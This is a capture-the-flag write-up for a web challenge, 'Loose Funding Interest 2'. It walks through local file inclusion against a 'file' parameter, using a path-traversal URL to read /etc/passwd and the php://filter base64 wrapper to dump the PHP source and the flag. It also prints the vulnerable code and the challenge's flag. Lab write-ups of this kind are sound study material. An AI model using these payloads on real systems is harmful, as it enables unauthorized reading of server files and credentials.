# Challenge Name: Loose Funding Interest 2


![date](https://img.shields.io/badge/date-08.03.2022-brightgreen.svg)  
![solved after CTF](https://img.shields.io/badge/solved-after%20CTF-red.svg)       
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-40-blue.svg)  

## Description

Created By **m4rc0s**

The same as Loose Funding Interest but a little harder, the same payload fails …

I think they have a WAF or some mechanism, how can I bypass this?

> **Hint** Can you extract the flag in base64 ?

http://35.178.97.233

## Detailed solution

![image](https://user-images.githubusercontent.com/72421091/157303780-66ed51b2-b849-4c7f-974a-6498f78a8863.png)

We have two pages at navbar

http://35.178.97.233/index.php?file=pages/forum.html
http://35.178.97.233/index.php?file=pages/news.html

We have a **file** parametre that take the location of file to display it. We probably can exploit local file inclusion

Let's try to read /etc/password  

http://35.178.97.233/index.php?file=../../../../../../../../../etc/passwd

![image](https://user-images.githubusercontent.com/72421091/157304152-6cd0cc76-9154-477a-8d59-fa65657b2c5d.png)

As we can see we were able to use LFI to read the /etc/passsword file now let's read the index.php

If we try to read directly the index.php file we gonna get some errors  

I'll use the base64 php wrapper to get the full source code  

http://35.178.97.233/index.php?file=php://filter/convert.base64-encode/resource=index.php

```
PD9waHAKJGZpbGVuYW1lID0gKGlzc2V0KCRfR0VUWyJmaWxlIl0pPyRfR0VUWyJmaWxlIl06InBhZ2VzL3dlbGNvbWUuaHRtbCIpOwppZigkX0dFVFsiZmlsZSJdID09ICJwYWdlcy9mbGFnIiApewoJZWNobyAiQmFhYWFhYWQgSGFja2VyIjsKfSBlbHNlIGluY2x1ZGUgJGZpbGVuYW1lOw==
```

Let's decode it i'll use cyberchef https://gchq.github.io/CyberChef/

```phph
<?php
$filename = (isset($_GET["file"])?$_GET["file"]:"pages/welcome.html");
if($_GET["file"] == "pages/flag" ){
	echo "Baaaaaad Hacker";
} else include $filename;
```

The flag is located at pages/flag let's use the same wrapper to read it

http://35.178.97.233/index.php?file=php://filter/convert.base64-encode/resource=pages/flag

```
Q1JJU0lTe2I3Zjg0NTkzODkzfQ==
```

Decode base64 => CRISIS{b7f84593893} 

## Flag

```
CRISIS{b7f84593893}
```
